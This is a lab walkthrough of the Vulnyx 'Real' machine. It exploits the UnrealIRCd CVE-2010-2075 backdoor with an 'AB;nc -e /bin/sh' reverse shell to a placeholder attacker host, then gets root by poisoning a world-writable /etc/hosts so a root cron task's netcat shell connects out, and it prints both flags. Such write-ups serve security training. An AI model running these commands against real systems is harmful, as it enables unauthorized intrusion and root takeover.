# Vulnyx: Real

| | |
|---|---|
| **Platform** | Vulnyx |
| **OS** | Linux |
| **Difficulty** | Low |
| **Creator** | `d4t4s3c` |
| **Tools used** | `nmap` · `ffuf` · `nc` · `pspy64` |
| **Tags** | `#KnownBackdoor` `#CVE-2010-2075` `#RCE` `#CronAbuse` `#HostsFilePoisoning` |
| **URL** | https://vulnyx.com/machines/ |

The IRC service running here is a trojaned build of UnrealIRCd 3.2.8.1, with a well-known backdoor (CVE-2010-2075) baked directly into the daemon: any message starting with `AB;` gets whatever follows it executed as a shell command. That's enough for a reverse shell. Root comes from `pspy` catching a root-owned scheduled task that connects out to a hardcoded hostname — one that `/etc/hosts` can be poisoned to redirect straight back to the attacker.

## Enumeration

### Port Enumeration

A full TCP port scan comes first:

```bash
$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn real.nyx

PORT     STATE  SERVICE      REASON
22/tcp   open   ssh          syn-ack ttl 64
80/tcp   open   http         syn-ack ttl 64
6667/tcp open   irc          syn-ack ttl 64
6697/tcp open   ircs-u       syn-ack ttl 64
8067/tcp open   infi-async   syn-ack ttl 64
MAC Address: 08:00:27:29:88:9E (Oracle VirtualBox virtual NIC)
```

Five ports come back open: **22 (SSH)**, **80 (HTTP)**, **6667**, **6697**, and **8067** — the first two of those are the standard plaintext and TLS ports for IRC. A version/script scan against all five fills in the details:

```bash
$ sudo nmap -p 22,80,6667,6697,8067 -sCV real.nyx

PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 db:28:2b:ab:63:2a:0e:d5:ea:18:8d:2f:6d:8c:45:2d (RSA)
|   256 cd:a1:c3:2e:20:f0:f3:f6:d3:9b:27:8e:9a:2d:26:11 (ECDSA)
|_  256 db:98:69:a5:8b:bd:05:86:16:3d:9c:8b:30:7b:a3:6c (ED25519)
80/tcp   open   http     Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
6667/tcp open   irc      UnrealIRCd
6697/tcp open   irc      UnrealIRCd
8067/tcp open   irc      UnrealIRCd
MAC Address: 08:00:27:29:88:9E (Oracle VirtualBox virtual NIC)
Service Info: Host: irc.foonet.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`UnrealIRCd` is the standout here — a specific daemon with a notorious history, worth checking against its known backdoor before touching anything else.

### Checking for the UnrealIRCd Backdoor

`nmap` ships a script that checks this exact service against that specific, well-known issue:

```bash
$ sudo nmap -p6667 --script="irc-unrealircd-backdoor" real.nyx

PORT     STATE  SERVICE
6667/tcp open   irc
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
MAC Address: 08:00:27:29:88:9E (Oracle VirtualBox virtual NIC)
```

Between 2009 and 2010, a compromised build of UnrealIRCd 3.2.8.1 circulated with a backdoor built directly into the daemon: any line sent to the server starting with `AB;` has everything after it executed as a shell command, no authentication required. The target comes back vulnerable.

### Web Enumeration

The web server is just the stock Apache default page, with nothing to work with:

```
http://real.nyx
```

<img src="../Images/real/Pasted image 20260729135010.png"/>

A content scan confirms it, turning up only the default index and the usual forbidden entries:

```bash
$ ffuf -u http://real.nyx/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.html,.txt -ic

index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 5ms]
.html                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 132ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 135ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 143ms]
.html                   [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 0ms]
.php                    [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 9ms]
                        [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 15ms]
server-status           [Status: 403, Size: 273, Words: 20, Lines: 10, Duration: 10ms]
:: Progress: [882188/882188] :: Job [1/1] :: 2666 req/sec :: Duration: [0:05:16] :: Errors: 0 ::
```

### IRC Enumeration

Before firing the backdoor, a plain connection to the IRC port and an `ADMIN` query pulls the server's administrative contact details — useful context, and a potential username (`bob`):

```bash
$ nc -vn real.nyx 6667
(UNKNOWN) [real.nyx] 6667 (ircd) open
:irc.foonet.com NOTICE AUTH :** Looking up your hostname...
:irc.foonet.com NOTICE AUTH :** Couldn't resolve your hostname; using your IP address instead
ADMIN
:irc.foonet.com 256 :Administrative info about irc.foonet.com
:irc.foonet.com 257 :Bob Smith
:irc.foonet.com 258 :bob
:irc.foonet.com 258 :widely@used.name
```

## Initial Access

### RCE via the UnrealIRCd Backdoor

The backdoor executes anything after `AB;` as a shell command, so a single line piped to the IRC port is enough to fire a reverse shell:

```bash
$ echo "AB;nc -e /bin/sh <ATTACKER_IP> <PORT>" | nc real.nyx 6667
```

A listener catches the callback:

```bash
$ nc -nlvp <PORT>
listening on [any] <PORT> ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [real.nyx] 53004
id
uid=1000(server) gid=1000(server) groups=1000(server)
```

### Shell as server

The shell is upgraded to something usable:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
server@real:~/irc/Unreal3.2$ id
uid=1000(server) gid=1000(server) groups=1000(server)
server@real:~/irc/Unreal3.2$ ls -l /home
total 4
drwx------ 4 server server 4096 May  3  2023 server
server@real:~/irc/Unreal3.2$ ls -l /home/server
total 8
drwx------ 3 server server 4096 Aug  8  2020 irc
-r-------- 1 server server   33 May  3  2023 user.txt
server@real:~/irc/Unreal3.2$ cat /home/server/user.txt
3b7fb7c1c8737a5c67dc513657e3efb3
```

> **User flag:** `3b7fb7c1c8737a5c67dc513657e3efb3`

## Privilege Escalation

### Hijacking a Root Task via `/etc/hosts`

`pspy` monitors running processes without needing root privileges, by reading procfs directly — useful for catching cron jobs or scheduled tasks that don't show up in the current user's own `crontab -l`:

```bash
server@real:~/irc/Unreal3.2$ cd /tmp
server@real:/tmp$ wget http://<ATTACKER_IP>:<PORT>/pspy64 -O pspy64
server@real:/tmp$ chmod +x pspy64
server@real:/tmp$ ./pspy64
```

```bash
2026/07/29 07:05:50 CMD: UID=0     PID=1      | /sbin/init
2026/07/29 07:06:01 CMD: UID=0     PID=16800  | /usr/sbin/CRON -f
2026/07/29 07:06:01 CMD: UID=0     PID=16801  | /usr/sbin/CRON -f
2026/07/29 07:06:01 CMD: UID=0     PID=16802  | /bin/sh -c /opt/task
2026/07/29 07:06:01 CMD: UID=0     PID=16803  | /bin/bash /opt/task
2026/07/29 07:06:01 CMD: UID=0     PID=16804  | timeout 1 bash -c "usr/bin/ping -c 1 shelly.real.nyx
2026/07/29 07:06:01 CMD: UID=0     PID=16805  | /bin/bash /opt/task
```

A periodic task is caught running as root. Its script and permissions are worth reading before anything else:

```bash
server@real:/tmp$ ls -l /opt/task
-rwx-wr-r-- 1 root root 277 May  3  2023 /opt/task
```

```bash
server@real:/tmp$ cat /opt/task
#!/bin/bash

domain='shelly.real.nyx'

function check(){

    timeout 1 bash -c "usr/bin/ping -c 1 $domain" > /dev/null 2>&1
    if [ "$(echo $?)" = "0" ]; then
        /usr/bin/nohup nc -e /usr/bin/sh $domain 65000
        exit 1
    fi
}

check
```

The task pings `shelly.real.nyx` on a loop, and the moment that ping succeeds, it opens a shell straight back to that same host on port 65000 — connecting out is contingent entirely on the name resolving to something reachable. `/etc/hosts` is checked and then poisoned, pointing that hostname at the attacker's own machine instead:

```bash
server@real:/tmp$ ls -l /etc/hosts
-rw-rw-rw- 1 root root 183 May  3  2023 /etc/hosts
server@real:/tmp$ cat /etc/hosts
127.0.0.1       localhost
1.2.3.4         real

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
server@real:/tmp$ echo "<ATTACKER_IP> shelly.real.nyx" >> /etc/hosts
server@real:/tmp$ cat /etc/hosts
127.0.0.1       localhost
1.2.3.4         real

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
<ATTACKER_IP> shelly.real.nyx
```

`/etc/hosts` being world-writable is what makes this possible — nothing about the task itself is broken, it's the file it trusts to resolve that hostname that isn't protected. The next time the task runs, its outbound connection lands on the attacker's listener instead of wherever it was originally meant to go — carrying root's privileges with it:

```bash
$ nc -nlvp 65000
listening on [any] 65000 ...
connect to [<ATTACKER_IP>] from (UNKNOWN) [real.nyx] 56862
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
[Ctrl + z]
stty raw -echo; fg
export TERM=xterm
```

```bash
root@real:~# id
uid=0(root) gid=0(root) groups=0(root)
root@real:~# ls -l /root/
total 4
-r-------- 1 root root 33 May  3  2023 root.txt
root@real:~# cat /root/root.txt
593ba7e2d1e66b12e1488d6ea30c8787
```

> **Root flag:** `593ba7e2d1e66b12e1488d6ea30c8787`

## Takeaways

- Checking a service's version against known, specific vulnerabilities (not just generic vuln scanners) is worth doing directly — a targeted `nmap` script for one CVE found this instantly, versus something a broad scan might have missed entirely.
- A scheduled task connecting out to a hostname, rather than a hardcoded IP, is a hijackable trust assumption if `/etc/hosts` is writable by anyone other than root — DNS (or its local override) doesn't need to be compromised at the server level to redirect where a name resolves.
- `pspy` is essential for catching privilege escalation vectors tied to timing — a root-owned cron job or scheduled task is invisible to a normal, permission-restricted process listing.